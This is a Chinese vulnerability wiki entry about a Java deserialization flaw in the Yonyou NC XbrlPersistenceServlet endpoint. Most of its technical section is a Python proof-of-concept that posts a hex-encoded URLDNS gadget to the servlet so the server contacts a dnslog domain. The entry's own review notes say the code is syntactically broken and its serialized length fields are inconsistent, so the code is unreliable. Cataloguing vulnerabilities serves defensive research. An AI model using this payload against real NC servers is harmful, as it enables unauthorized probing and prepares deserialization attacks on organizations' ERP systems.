---
source: "Threekiii/Vulnerability-Wiki"
title: "用友NC XbrlPersistenceServlet URLDNS迹象"
product: "用友NC"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "实测6.5声明"
prerequisites: "未知"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://github.com/Threekiii/Vulnerability-Wiki"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BNC/%E7%94%A8%E5%8F%8B-NC-XbrlPersistenceServlet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.md"
id: "vw-60808234eba0b4c0b37b0479"
entity_id: "ve-60808234eba0b4c0b37b0479"
schema_version: "1"
---

# 用友NC XbrlPersistenceServlet URLDNS迹象

## 条目说明

- 对象与具体问题：用友NC；XbrlPersistenceServlet URLDNS迹象
- 版本、配置及部署条件：实测6.5声明
- 认证与权限前提：未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- dnslog引号和URL拼接语法损坏，说明文字放Python块
- 固定序列化长度替换域未同步，binary str编码需核
- URLDNS不能证RCE

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

### 漏洞描述

用友 NC XbrlPersistenceServlet反序列化漏洞

### 漏洞影响

```
用友NC
```

### 漏洞复现

```python
攻击队利用用友nc反序列利用
目前测试影响版本：nc6.5
漏洞url为：
/service/~xbrl/XbrlPersistenceServlet
poc：

import requests
import threadpool
import urllib3
import sys
import base64

ip = ""
dnslog = "\x79\x37\x64\x70\" #dnslog把字符串转16进制替换该段，测试用的ceye.io可以回显
data = "\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x01\x73\x72\x00\x0c\x6a\x61\x76\x61\x2e\x6e\x65\x74\x2e\x55\x52\x4c\x96\x25\x37\x36\x1a\xfc\xe4\x72\x03\x00\x07\x49\x00\x08\x68\x61\x73\x68\x43\x6f\x64\x65\x49\x00\x04\x70\x6f\x72\x74\x4c\x00\x09\x61\x75\x74\x68\x6f\x72\x69\x74\x79\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x04\x66\x69\x6c\x65\x71\x00\x7e\x00\x03\x4c\x00\x04\x68\x6f\x73\x74\x71\x00\x7e\x00\x03\x4c\x00\x08\x70\x72\x6f\x74\x6f\x63\x6f\x6c\x71\x00\x7e\x00\x03\x4c\x00\x03\x72\x65\x66\x71\x00\x7e\x00\x03\x78\x70\xff\xff\xff\xff\x00\x00\x00\x50\x74\x00\x11"+dnslog+"\x3a\x38\x30\x74\x00\x00\x74\x00\x0e"+dnslog+"\x74\x00\x04\x68\x74\x74\x70\x70\x78\x74\x00\x18\x68\x74\x74\x70\x3a\x2f\x2f"+dnslog+"\x3a\x38\x30\x78"

uploadHeader={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"}
req = requests.post("http://+"ip"+/service/~xbrl/XbrlPersistenceServlet", headers=uploadHeader, verify=False, data=data, timeout=25)
print (req.text)
```

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
